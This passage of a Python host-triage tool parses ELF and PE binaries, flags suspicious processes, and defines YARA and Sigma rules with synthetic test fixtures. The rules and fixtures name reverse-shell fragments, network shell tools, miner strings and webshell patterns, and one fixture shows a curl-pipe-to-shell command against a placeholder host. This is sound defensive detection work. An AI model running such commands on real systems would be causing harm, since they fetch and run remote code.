             _phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx) = struct.unpack(
                endian + "HHIQQQIHHHHHH", data[16:64])
        else:
            (e_type, e_machine, _ver, e_entry, e_phoff, e_shoff, _flags, _ehsize,
             _phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx) = struct.unpack(
                endian + "HHIIIIIHHHHHH", data[16:52])
    except struct.error as exc:
        return {"error": f"header parse: {exc}"}, []
    header.update({"type": e_type, "machine": e_machine, "entry_point": hex(e_entry),
                   "program_headers": e_phnum, "section_headers": e_shnum})
    # Section-name string table.
    names = b""
    if e_shnum and e_shstrndx < e_shnum and e_shentsize:
        off = e_shoff + e_shstrndx * e_shentsize
        try:
            if is64:
                _n, sh_type, _f, _a, sh_offset, sh_size = struct.unpack(
                    endian + "IIQQQQ", data[off:off + 40])
            else:
                _n, sh_type, _f, _a, sh_offset, sh_size = struct.unpack(
                    endian + "IIIIII", data[off:off + 24])
            names = data[sh_offset:sh_offset + sh_size]
        except struct.error:
            names = b""
    for i in range(min(e_shnum, 64)):
        off = e_shoff + i * e_shentsize
        try:
            if is64:
                (sh_name, _sh_type, sh_flags, _sh_addr, sh_offset, sh_size, _link,
                 _info, _align, _entsize) = struct.unpack(endian + "IIQQQQIIQQ", data[off:off + 64])
            else:
                (sh_name, _sh_type, sh_flags, _sh_addr, sh_offset, sh_size, _link,
                 _info, _align, _entsize) = struct.unpack(endian + "IIIIIIIIII", data[off:off + 40])
        except struct.error:
            break
        name = "?"
        if names:
            end = names.find(b"\x00", sh_name)
            name = names[sh_name:end if end > 0 else sh_name + 24].decode("latin-1", "replace") or "?"
        if sh_size == 0 or sh_offset >= len(data):
            continue
        blob = data[sh_offset:min(sh_offset + sh_size, sh_offset + (4 << 20))]
        flags = ("W" if sh_flags & 0x1 else "") + ("A" if sh_flags & 0x2 else "") + \
                ("X" if sh_flags & 0x4 else "")
        sections.append({"name": name, "size": sh_size, "entropy": entropy(blob),
                         "flags": flags or "-"})
    for ph in range(min(e_phnum, 32)):
        off = e_phoff + ph * _phentsize
        try:
            if is64:
                p_type, _pf, _po, _pv, _pp, p_fsz, p_msz, p_flags = struct.unpack(
                    endian + "IIQQQQQQ", data[off:off + 56])
            else:
                p_type, _po, _pv, _pp, p_fsz, p_msz, p_flags = struct.unpack(
                    endian + "IIIIIII", data[off:off + 28])
        except struct.error:
            break
        if p_type == 0x6474E551 and p_flags & 0x1:  # PT_GNU_STACK + X
            header["executable_stack"] = True
    return header, sections


def pe_facts(path: str) -> tuple[dict, list[dict]]:
    """PE header + section table facts via pure python."""
    import struct
    header: dict[str, Any] = {}
    sections: list[dict] = []
    try:
        with open(path, "rb") as fh:
            data = fh.read(4 << 20)
    except OSError as exc:
        return {"error": str(exc)}, []
    if len(data) < 0x40 or data[:2] != b"MZ":
        return {"error": "not PE"}, []
    try:
        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        if data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
            return {"error": "no PE signature"}, []
        machine, nsec, _ts, _ps, _ns, opt_size, chars = struct.unpack_from(
            "<HHIIIHH", data, e_lfanew + 4)
        header.update({"machine": hex(machine), "sections": nsec,
                       "characteristics": hex(chars)})
        opt_off = e_lfanew + 24
        magic = struct.unpack_from("<H", data, opt_off)[0]
        header["optional_magic"] = hex(magic)
        if magic == 0x10B:
            ep = struct.unpack_from("<I", data, opt_off + 16)[0]
            header["entry_point"] = hex(ep)
            header["subsystem"] = struct.unpack_from("<H", data, opt_off + 68)[0]
            header["dll_characteristics"] = hex(struct.unpack_from("<H", data, opt_off + 70)[0])
        elif magic == 0x20B:
            ep = struct.unpack_from("<I", data, opt_off + 16)[0]
            header["entry_point"] = hex(ep)
            header["subsystem"] = struct.unpack_from("<H", data, opt_off + 68)[0]
            header["dll_characteristics"] = hex(struct.unpack_from("<H", data, opt_off + 70)[0])
        sec_off = opt_off + opt_size
        for i in range(min(nsec, 32)):
            off = sec_off + i * 40
            name_b, vsize, vaddr, rawsize, rawptr = struct.unpack_from("<8sIIII", data, off)
            s_chars = struct.unpack_from("<I", data, off + 36)[0]
            name = name_b.split(b"\x00")[0].decode("latin-1", "replace")
            blob = data[rawptr:rawptr + min(rawsize, 4 << 20)]
            flags = ("W" if s_chars & 0x80000000 else "") + \
                    ("R" if s_chars & 0x40000000 else "") + \
                    ("X" if s_chars & 0x20000000 else "")
            sections.append({"name": name, "vaddr": hex(vaddr), "size": rawsize,
                             "entropy": entropy(blob), "flags": flags or "-"})
    except struct.error as exc:
        header["error"] = f"PE parse: {exc}"
    return header, sections


# ========================================================= process triage ====
PROCESS_RULES = [
    "executable-in-tmp-or-shm: exe or argv[0] resolves under /tmp, /dev/shm or /var/tmp",
    "deleted-binary: /proc/<pid>/exe resolves to a path ending ' (deleted)'",
    "unusual-parent: a shell (sh/bash/dash/zsh) directly spawned a network client "
    "(nc/ncat/socat/curl/wget/ssh/telnet), or such a client was reparented to init (ppid 1)",
    "high-thread-count: num_threads >= 64",
    "listener-without-tty: LISTEN socket owned by a process whose session has no controlling tty",
    "miner-or-shell-pattern: cmdline matches known miner/reverse-shell/download-exec patterns",
]


def read_tty_nr(pid: int) -> int | None:
    try:
        with open(f"/proc/{pid}/stat", "rb") as fh:
            stat = fh.read().decode("latin-1")
        # comm may contain spaces; fields after the last ')' are space separated.
        fields = stat.rsplit(")", 1)[1].split()
        return int(fields[4])  # tty_nr is field 7 overall, index 4 after comm/state
    except (OSError, IndexError, ValueError):
        return None


def process_triage() -> dict:
    import psutil
    listeners: dict[int, list[dict]] = {}
    try:
        for c in psutil.net_connections(kind="inet"):
            if c.status == psutil.CONN_LISTEN and c.pid:
                listeners.setdefault(c.pid, []).append(
                    {"laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "",
                     "family": str(c.family), "type": str(c.type)})
    except Exception:
        listeners = {}
    total = 0
    flagged: list[dict] = []
    for proc in psutil.process_iter(["pid", "ppid", "name", "exe", "cmdline", "username"]):
        total += 1
        try:
            info = proc.info
        except Exception:
            continue
        pid = info.get("pid") or 0
        if pid <= 1:
            continue
        exe = info.get("exe") or ""
        cmdline = " ".join(info.get("cmdline") or [])[:400]
        argv0 = (info.get("cmdline") or [""])[0] if info.get("cmdline") else ""
        reasons: list[str] = []
        for cand in (exe, argv0):
            if cand.startswith(("/tmp/", "/dev/shm/", "/var/tmp/")):
                reasons.append("executable-in-tmp-or-shm")
                break
        try:
            real = os.readlink(f"/proc/{pid}/exe")
            if real.endswith(" (deleted)"):
                reasons.append("deleted-binary")
                exe = real
        except OSError:
            pass
        try:
            threads = proc.num_threads()
        except Exception:
            threads = 0
        if threads >= 64:
            reasons.append(f"high-thread-count({threads})")
        if MINER_SHELL_PATTERNS.search(cmdline):
            reasons.append("miner-or-shell-pattern")
        # unusual-parent: a shell/interpreter directly spawned a network client,
        # or a network client was reparented straight to init (ppid 1).
        NET_CLIENTS = {"nc", "ncat", "socat", "curl", "wget", "ssh", "telnet"}
        try:
            pname = psutil.Process(info.get("ppid") or 0).name().lower()
        except Exception:
            pname = ""
        name = (info.get("name") or "").lower()
        if pname in ("sh", "bash", "dash", "zsh") and name in NET_CLIENTS:
            reasons.append("unusual-parent")
        elif info.get("ppid") == 1 and name in NET_CLIENTS:
            reasons.append("unusual-parent")
        if pid in listeners:
            tty = read_tty_nr(pid)
            if tty == 0:
                reasons.append("listener-without-tty")
        if reasons:
            flagged.append({"pid": pid, "ppid": info.get("ppid"), "name": info.get("name", ""),
                            "exe": exe[:200], "cmdline": cmdline,
                            "user": info.get("username", ""), "threads": threads,
                            "reasons": sorted(set(reasons)),
                            "listeners": listeners.get(pid, [])})
    return {"processes": total, "flagged": flagged, "rules": PROCESS_RULES,
            "listeners": [{"pid": p, "sockets": s} for p, s in list(listeners.items())[:20]],
            "host": socket.gethostname()}


# ==================================================================== YARA ====
YARA_RULES = {
    "wd_botnet_c2.yar": r'''
rule WD_Botnet_C2_StringSet
{
    meta:
        author = "WD CYBER TOOLKIT NEO"
        description = "Generic botnet/C2 string set (marker strings, not a family signature)"
        severity = "high"
    strings:
        $c2_marker   = "WD-IOC-TEST-C2-MARKER" nocase
        $irc_join    = "JOIN #" nocase
        $bot_cmd     = "!shell" nocase
        $beacon      = "beacon_interval" nocase
    condition:
        2 of them
}

rule WD_Reverse_Shell_Command
{
    meta:
        author = "WD CYBER TOOLKIT NEO"
        description = "Reverse shell one-liner fragments"
        severity = "high"
    strings:
        $devtcp = "/dev/tcp/" ascii
        $nc_e   = "nc -e /bin/sh" nocase
    condition:
        any of them
}
''',
    "wd_cryptominer.yar": r'''
rule WD_CryptoMiner_Indicators
{
    meta:
        author = "WD CYBER TOOLKIT NEO"
        description = "Crypto-miner pool/CLI indicators"
        severity = "high"
    strings:
        $stratum = "stratum+tcp://" nocase
        $pool    = "pool.minexmr" nocase
        $xmrig   = "xmrig" nocase
        $donate  = "--donate-level" nocase
        $algo    = "cryptonight" nocase
    condition:
        2 of them
}
''',
    "wd_webshell.yar": r'''
rule WD_Webshell_PHP_Eval_Chain
{
    meta:
        author = "WD CYBER TOOLKIT NEO"
        description = "PHP webshell eval/exec with request-controlled input"
        severity = "critical"
    strings:
        $eval_get  = /\beval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/ nocase
        $sys_exec  = /\b(system|shell_exec|passthru|popen)\s*\(\s*\$_(GET|POST|REQUEST)/ nocase
        $marker    = "WD-IOC-TEST-WEBSHELL" ascii
    condition:
        any of them
}
''',
}


def write_yara_rules(rule_dir: str) -> list[str]:
    written = []
    for name, body in YARA_RULES.items():
        path = os.path.join(rule_dir, name)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(body.lstrip("\n"))
        written.append(name)
    return written


def write_yara_fixtures(fixture_dir: str) -> list[str]:
    """Deterministic fixtures that MUST match, so the integration is provably wired.

    These are synthetic test files, not malware: they only contain the marker
    strings the rules above look for.
    """
    fixtures = {
        "wd_fixture_botnet.txt": (
            "# synthetic YARA test fixture for WD_Botnet_C2_StringSet (not malware)\n"
            "WD-IOC-TEST-C2-MARKER\n"
            "irc.example.test 6667 JOIN #botnet\n"
            "beacon_interval=30\n"),
        "wd_fixture_miner.txt": (
            "# synthetic YARA test fixture for WD_CryptoMiner_Indicators (not malware)\n"
            "stratum+tcp://pool.minexmr.example:3333\n"
            "xmrig --donate-level 1 -o pool\n"),
        "wd_fixture_clean.txt": (
            "# synthetic negative control: contains none of the rule strings\n"
            "hello world, this file is expected to match nothing\n"),
    }
    out = []
    for name, body in fixtures.items():
        path = os.path.join(fixture_dir, name)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(body)
        out.append(path)
    return out


def parse_yara_output(stdout: str) -> list[dict]:
    """Parse `yara -s` output: 'RuleName file' followed by matched-string lines."""
    matches: list[dict] = []
    for line in (stdout or "").splitlines():
        if not line.strip() or line.startswith(("0x", "$", "\t", " ")):
            continue
        parts = line.split(None, 1)
        if len(parts) == 2:
            matches.append({"rule": parts[0], "target": parts[1].strip()})
    return matches


# =================================================================== SIGMA ====
# Documented subset only: selection maps, modifiers contains/startswith/endswith/
# re/gt/gte/lt/eq, and conditions "sel", "all of sel_*", "1 of sel_*",
# "sel_a and sel_b" / "sel_a or sel_b". No aggregation, no |count, no |near.
SIGMA_RULES: list[dict] = [
    {
        "title": "Linux - Execution From World-Writable Directory",
        "id": "WD-SIG-001",
        "level": "high",
        "logsource": {"product": "linux", "category": "process_creation"},
        "detection": {
            "selection_tmp": {"Image|startswith": ["/tmp/", "/dev/shm/", "/var/tmp/"]},
            "selection_cmd": {"CommandLine|contains": ["/dev/shm/", "/tmp/.x"]},
            "condition": "1 of selection_*",
        },
    },
    {
        "title": "Download And Execute Command Line",
        "id": "WD-SIG-002",
        "level": "high",
        "logsource": {"product": "linux", "category": "process_creation"},
        "detection": {
            "download_exec": {"CommandLine|re": r"(curl|wget)[^|]*\|\s*(ba)?sh"},
            "condition": "download_exec",
        },
    },
    {
        "title": "Connection To Commodity C2 Port",
        "id": "WD-SIG-003",
        "level": "medium",
        "logsource": {"product": "linux", "category": "network_connection"},
        "detection": {
            "selection_port": {"DestinationPort": [4444, 1337, 31337, 6667, 9001]},
            "condition": "selection_port",
        },
    },
    {
        "title": "Miner Process Command Line",
        "id": "WD-SIG-004",
        "level": "high",
        "logsource": {"product": "linux", "category": "process_creation"},
        "detection": {
            "selection_name": {"Image|endswith": ["xmrig", "minerd", "kdevtmpfsi"]},
            "selection_cmd": {"CommandLine|contains": ["stratum+tcp://", "--donate-level"]},
            "condition": "selection_name or selection_cmd",
        },
    },
]

SIGMA_FIXTURE_EVENTS: list[dict] = [
    {"ts": "1970-01-01T00:00:00Z", "pid": 4242, "source": "fixture",
     "Image": "/tmp/.x/payload", "CommandLine": "/tmp/.x/payload --silent",
     "ParentImage": "/bin/sh", "User": "fixture-user"},
    {"ts": "1970-01-01T00:00:01Z", "pid": 4243, "source": "fixture",
     "Image": "/bin/bash", "CommandLine": "bash -c 'curl http://example.test/i.sh | sh'",
     "ParentImage": "/usr/bin/cron", "User": "fixture-user"},
]


def sigma_match(rule: dict, event: dict) -> bool:
    """Evaluate the documented Sigma subset against one event dict."""
    detection = rule.get("detection") or {}
    selections = {k: v for k, v in detection.items() if k != "condition"}
    condition = str(detection.get("condition", "")).strip()

    def eval_selection(sel: dict) -> bool:
        for field_expr, expected in sel.items():
            field, _, modifier = field_expr.partition("|")
            actual = event.get(field)
            if actual is None:
                return False
            values = expected if isinstance(expected, list) else [expected]
            if not any(match_value(actual, v, modifier) for v in values):
                return False
        return True

    if condition in selections:
        return eval_selection(selections[condition])
    m = re.fullmatch(r"(1|all) of ([A-Za-z0-9_*]+)", condition)
    if m:
        quant, pattern = m.groups()
        names = [n for n in selections if pattern.endswith("*") and n.startswith(pattern[:-1])] \
            if pattern.endswith("*") else [n for n in selections if n == pattern]
        hits = [eval_selection(selections[n]) for n in names]
        return any(hits) if quant == "1" else (bool(hits) and all(hits))
    if " and " in condition or " or " in condition:
        expr = condition
        for name in selections:
            expr = re.sub(rf"\b{re.escape(name)}\b", str(eval_selection(selections[name])), expr)
        expr = expr.replace(" and ", " and ").replace(" or ", " or ")
        try:
            return bool(eval(expr, {"__builtins__": {}}, {}))  # only booleans remain
        except Exception:
            return False
    return False


def match_value(actual: Any, expected: Any, modifier: str) -> bool:
    """Field comparison supporting the documented modifier subset."""
    if modifier in ("gt", "gte", "lt"):
        try:
            a, b = float(actual), float(expected)
        except (TypeError, ValueError):
            return False
        return a > b if modifier == "gt" else (a >= b if modifier == "gte" else a < b)
    a = str(actual)
    b = str(expected)
    if modifier == "contains":
        return b.lower() in a.lower()
    if modifier == "startswith":
        return a.lower().startswith(b.lower())
    if modifier == "endswith":
        return a.lower().endswith(b.lower())
    if modifier == "re":
        try:
            return re.search(b, a, re.IGNORECASE) is not None
        except re.error:
            return False
    if isinstance(expected, (int, float)) and isinstance(actual, (int, float)):
        return actual == expected
    return a.lower() == b.lower()


def load_events(path: str) -> tuple[list[dict], int]:
    events: list[dict] = []
    bad = 0
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                bad += 1
                continue
            if isinstance(obj, dict):
                events.append(obj)
    return events, bad


def host_events() -> list[dict]:
    """JSONL-shaped event records from this host's real process list and sockets."""
    import datetime as dt
    import psutil
    events: list[dict] = []
    now = dt.datetime.now(dt.timezone.utc).isoformat()
    try:
        procs = list(psutil.process_iter(["pid", "ppid", "name", "exe", "cmdline", "username"]))
    except Exception:
        return events
    for proc in procs:
        info = proc.info
        parent_image = ""
        try:
            parent_image = psutil.Process(info["ppid"]).exe() or ""
        except Exception:
            parent_image = ""
        events.append({
            "ts": now, "pid": info["pid"], "ppid": info["ppid"], "source": "live-psutil",
            "Image": info.get("exe") or "", "CommandLine": " ".join(info.get("cmdline") or []),
            "ParentImage": parent_image, "User": info.get("username") or "",
            "Name": info.get("name") or "",
        })
    try:
        for c in psutil.net_connections(kind="inet"):
            if not c.raddr:
                continue
            events.append({
                "ts": now, "pid": c.pid or 0, "source": "live-psutil",
                "Image": "", "CommandLine": "", "ParentImage": "",
                "DestinationIp": c.raddr.ip, "DestinationPort": int(c.raddr.port),
                "User": "", "Name": "",
            })
    except Exception:
        pass
    events.extend(dict(e) for e in SIGMA_FIXTURE_EVENTS)
    return events
